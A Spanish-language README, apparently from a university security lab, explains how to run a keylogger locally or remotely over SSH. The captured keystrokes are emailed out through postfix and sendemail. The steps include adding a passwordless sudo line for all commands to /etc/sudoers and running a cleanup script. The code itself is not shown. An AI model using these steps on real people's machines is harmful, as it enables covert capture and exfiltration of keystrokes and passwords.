Instrucciones de Uso - KeyLogger
Requisitos Previos
----------------------------------------------------------------
Se instala el siguiente paquete :
  - sudo apt install sendemail
  - sudo apt update
  - sudo apt install postfix
    Configuración :
      - Internet site
  - sudo systemctl start postfix

----------------------------------------------------------------
Para correr el programa de manera local se ejecuta -
  sudo  python3 KeyLogger2.py
-------------------------------------------------------------

Para correr el programa de manera remota se ejcuta -
  Computadora remota :
    - Conéctate al servidor remoto a través de SSH. Puedes usar el siguiente comando desde tu terminal local
    y luego ejecuta lo siguiente :
       - sudo su
       - nano /etc/sudoers
       - Desplázate hasta el final del archivo y agrega la siguiente línea:
           kali ALL=(ALL) NOPASSWD: ALL
           - Guardamos y Cerramos
  Computadora local :
  Ejecuta :
        ssh usuario@direccion_remota "python3 /ruta/del/archivo/keylogger.py"
        Ejemplo : ssh kali@192.168.0.20 "sudo python3 /home/kali/Documents/PGIT1/crypto-lab-20242/practica04/KeyLogger2.py"D
  OJO :
  En caso de obtener un ERROR como este :
    May 15 23:03:41 kali sendemail[12475]: ERROR => Connection attempt to localhost:25 failed: IO::Socket::INET6: connect: Connection refused
    Terminando la ejecución del programa...
  Es debido que tiene que volver a iniciar Postfix :
    sudo systemctl restart postfix

--------------------------------------------------------------------------------
Para el cleanUp :
   - chmod +x /path/to/clean.sh
   - ./clean.sh

Configuración Adicional
 El keylogger llegará a tu correo en la parte de SPAM,
 revuisa tu papelera, por favor !!!


Notas Importantes
- Ten en cuenta que este programa captura las pulsaciones de teclas y puede ser utilizado únicamente con fines educativos o de investigación. El uso inadecuado o no autorizado de este programa puede violar las leyes de privacidad y seguridad.
